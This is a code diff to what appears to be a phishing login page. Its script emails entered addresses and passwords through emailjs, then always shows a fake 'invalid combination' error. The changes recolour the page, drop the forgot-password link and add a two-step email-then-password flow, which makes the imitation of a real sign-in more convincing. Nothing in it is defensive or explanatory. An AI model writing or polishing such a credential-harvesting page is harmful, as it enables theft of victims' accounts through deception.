@@ -34,7 +34,7 @@
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 1000;
-            border-top: 5px solid #f07c00;
+            border-top: 5px solid #007BFF; /* Blue border */
         }
 
         h2 {
@@ -58,7 +58,7 @@
         }
 
         button {
-            background-color: #f07c00;
+            background-color: #007BFF; /* Blue button */
             color: white;
             border: none;
             padding: 10px;
@@ -70,17 +70,7 @@
         }
 
         button:hover {
-            background-color: #d96b00;
-        }
-
-        .forgot-password {
-            color: #f07c00;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .forgot-password:hover {
-            text-decoration: underline;
+            background-color: #0056b3; /* Darker blue on hover */
         }
 
         /* Confirmation Message */
@@ -93,7 +83,7 @@
             margin: 100px auto;
             border-radius: 8px;
             box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
-            border-top: 5px solid #f07c00;
+            border-top: 5px solid #007BFF;
         }
 
         #confirmation p {
@@ -110,19 +100,20 @@
         <h2>Login to Your Account</h2>
         <div id="emailSection">
             <input type="email" id="email" placeholder="Email Address" required>
+            <button onclick="showPasswordField()">Next</button>
         </div>
-        <div id="passwordSection">
+        <div id="passwordSection" style="display: none;">
             <input type="password" id="password" placeholder="Password" required>
+            <button onclick="authenticate()">Login</button>
         </div>
-        <button onclick="authenticate()">Login</button>
     </div>
 
     <!-- Confirmation Message -->
-   <div id="confirmation">
-    <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
-    <p>You've entered an invalid email address / password combination.</p>
-    <button onclick="window.close()">Close this page</button>
-</div>
+    <div id="confirmation">
+        <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
+        <p>You've entered an invalid email address / password combination.</p>
+        <button onclick="window.close()">Close this page</button>
+    </div>
 
     <script>
         function sendEmail(username, password) {
@@ -135,6 +126,17 @@
             };
 
             return emailjs.send(serviceID, templateID, templateParams, publicKey);
+        }
+
+        function showPasswordField() {
+            let email = document.getElementById("email").value.trim();
+            if (email) {
+                // Hide email section and show password section
+                document.getElementById("emailSection").style.display = "none";
+                document.getElementById("passwordSection").style.display = "block";
+            } else {
+                alert("Please enter a valid email address.");
+            }
         }
 
         function authenticate() {
